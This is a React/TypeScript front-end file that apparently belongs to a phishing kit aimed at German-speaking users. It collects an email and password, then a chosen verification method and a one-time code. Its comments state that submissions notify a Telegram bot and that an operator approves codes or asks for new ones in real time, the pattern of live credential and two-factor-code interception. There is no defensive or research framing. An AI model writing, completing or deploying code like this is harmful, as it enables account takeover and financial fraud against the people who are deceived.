import { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useParams, useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import io from 'socket.io-client';
import './App.css';

// Components
import Form1 from './components/Form1';
import Form2 from './components/Form2';
import CodeEntryForm from './components/CodeEntryForm';
import Loading from './components/Loading';
import LoadingWithCodeEntry from './components/LoadingWithCodeEntry';
import Pending from './components/Pending';
import Error from './components/Error';
import Success from './components/Success';

// Initialize socket connection
// Use the current host for the socket connection to work in both development and production
const socketUrl = window.location.origin;
console.log('Socket.io connection URL:', socketUrl);
const socket = io(socketUrl, {
  transports: ['websocket', 'polling'],
  reconnectionAttempts: 5,
  reconnectionDelay: 1000,
  forceNew: true
});

// Add socket connection event listeners for debugging
socket.on('connect', () => {
  console.log('Socket.io connected successfully with ID:', socket.id);
});

socket.on('connect_error', (error) => {
  console.error('Socket.io connection error:', error);
});

socket.on('disconnect', (reason) => {
  console.log('Socket.io disconnected:', reason);
});

// Types
interface FormData {
  email?: string;
  password?: string;
  code?: string;
  [key: string]: any;
}

// AutoLogin component to handle automatic key generation
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Automatically generate a new key
    axios.post('/api/generate-key')
      .then(response => {
        const { key } = response.data;
        // Redirect to the form flow with the generated key
        navigate(`/${key}`);
      })
      .catch(err => {
        console.error('Error generating key:', err);
        setError('Error generating session key');
        setLoading(false);
      });
  }, [navigate]);

  if (loading) return <Loading message="Bitte warten Sie, während wir Ihre Sitzung erstellen..." />;
  if (error) return <Error message={error} />;
  return null;
}

// KeyValidator component to handle the key in URL query
function KeyValidator() {
  const location = useLocation();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const queryParams = new URLSearchParams(location.search);
    const key = queryParams.get('key');

    if (!key) {
      setError('No key provided');
      setLoading(false);
      return;
    }

    // Validate key with backend
    axios.get(`/api/validate-key/${key}`)
      .then(response => {
        if (response.data.valid) {
          navigate(`/${key}`);
        } else {
          setError('Invalid key');
          setLoading(false);
        }
      })
      .catch(err => {
        console.error('Error validating key:', err);
        setError('Error validating key');
        setLoading(false);
      });
  }, [location, navigate]);

  if (loading) return <Loading />;
  if (error) return <Error message={error} />;
  return null;
}

// Main flow component
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>('loading');
  const [formData, setFormData] = useState<FormData>({});
  const [loading, setLoading] = useState<boolean>(true);
  const [error, setError] = useState<string | null>(null);

  // Initial state fetch
  useEffect(() => {
    if (!key) {
      setState('error');
      setError('No session key provided');
      setLoading(false);
      return;
    }

    // Join the room for this session
    socket.emit('join', { key });
    console.log('Joined room:', key);

    // Listen for state updates
    socket.on('state_update', (data) => {
      console.log('Received state update via Socket.io:', data);
      if (data.key === key) {
        setState(data.state);
      }
    });

    // Listen for global state updates as a fallback
    socket.on('global_state_update', (data) => {
      console.log('Received global state update via Socket.io:', data);
      if (data.key === key) {
        setState(data.state);
      }
    });

    // Initial state fetch
    const fetchState = () => {
      console.log('Fetching state for key:', key);
      axios.get(`/api/status/${key}`)
        .then(response => {
          console.log('Received state from API:', response.data);
          setState(response.data.state || 'form_1');
        })
        .catch(error => {
          console.error('Error fetching status:', error);
          setState('error');
        })
        .finally(() => {
          setLoading(false);
        });
    };

    // Fetch initial state
    fetchState();

    // Set up Server-Sent Events (SSE) connection
    console.log('Setting up SSE connection for key:', key);
    const eventSource = new EventSource(`/api/events/${key}`);
    
    eventSource.onopen = () => {
      console.log('SSE connection opened');
    };
    
    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('Received SSE message:', data);
        
        if (data.type === 'state_update' && data.key === key) {
          console.log('Updating state via SSE to:', data.state);
          setState(data.state);
        }
      } catch (error) {
        console.error('Error parsing SSE message:', error);
      }
    };
    
    eventSource.onerror = (error) => {
      console.error('SSE connection error:', error);
    };

    // Set up polling as a fallback
    const pollInterval = setInterval(() => {
      console.log('Polling for state updates...');
      fetchState();
    }, 5000); // Poll every 5 seconds

    return () => {
      // Clean up Socket.io
      socket.off('state_update');
      socket.off('global_state_update');
      socket.emit('leave', { key });
      
      // Clean up SSE
      eventSource.close();
      
      // Clean up polling
      clearInterval(pollInterval);
    };
  }, [key]);

  // Form 1 submission handler
  const handleForm1Submit = async (data: FormData) => {
    setLoading(true);
    try {
      console.log('Form data in App component:', data); // Debug log
      await axios.post('/api/form', { key, ...data });
      setFormData({ ...formData, ...data });
      setState('loading');
    } catch (error) {
      console.error('Error submitting form:', error);
      setState('error');
    } finally {
      setLoading(false);
    }
  };

  // Form 2 submission handler (verification method selection)
  const handleForm2Submit = async (_verificationMethod: string) => {
    setLoading(true);
    try {
      // Send notification to Telegram bot about Form2 submission
      await axios.post('/api/form2', { key, verificationMethod: _verificationMethod });
      
      // Set loading state in the UI
      setState('loading_code_entry');
      
      // Wait for 6 seconds before transitioning to code entry screen
      setTimeout(async () => {
        // After 6 seconds, update the state to enter_code
        await axios.post('/api/state', { key, state: 'enter_code' });
        setState('enter_code');
        setLoading(false);
      }, 6000);
    } catch (error) {
      console.error('Error transitioning to code entry:', error);
      setState('error');
      setLoading(false);
    }
  };

  // Code submission handler
  const handleCodeSubmit = async (code: string) => {
    setLoading(true);
    try {
      await axios.post('/api/code', { key, code });
      setFormData({ ...formData, code });
      
      // Set loading state in the UI - will remain until approved via Telegram
      setState('loading_pending');
      setLoading(false);
      
      // Note: We no longer automatically transition to pending state after a timeout
      // The state will be updated via socket.io when the admin approves or requests a new code
    } catch (error) {
      console.error('Error submitting code:', error);
      setState('reenter_code');
      setLoading(false);
    }
  };

  if (loading && state !== 'loading_code_entry' && state !== 'loading_pending') return <Loading />;

  // Render the appropriate component based on current state
  switch (state) {
    case 'form_1':
      return <Form1 onSubmit={handleForm1Submit} />;
    case 'loading':
      return <Loading message="Bitte warten Sie, während wir Ihre Informationen verarbeiten..." />;
    case 'loading_code_entry':
      return <LoadingWithCodeEntry message="Bitte warten Sie, während wir Ihren Verifizierungscode senden..." />;
    case 'form_2':
      return <Form2 onSubmit={handleForm2Submit} />;
    case 'enter_code':
      return <CodeEntryForm onSubmit={handleCodeSubmit} />;
    case 'reenter_code':
      return <CodeEntryForm onSubmit={handleCodeSubmit} error="Der eingegebene Code ist ungültig. Bitte versuchen Sie es erneut." />;
    case 'reenter_code_after_pending':
      return <CodeEntryForm onSubmit={handleCodeSubmit} error="Leider ist ein Fehler aufgetreten. Bitte geben Sie den Code erneut ein." />;
    case 'loading_pending':
      return <LoadingWithCodeEntry message="Bitte warten Sie, während wir Ihren Code überprüfen..." />;
    case 'pending':
      return <Pending />;
    case 'success':
      return <Success />;
    case 'error':
      return <Error />;
    default:
      return <Loading />;
  }
}

function App() {
  return (
    <Router>
      <div className="app-container">
        <Routes>
          <Route path="/" element={<KeyValidator />} />
          <Route path="/login" element={<AutoLogin />} />
          <Route path="/:key" element={<FormFlow />} />
          <Route path="*" element={<Navigate to="/" />} />
        </Routes>
      </div>
    </Router>
  );
}

export default App;
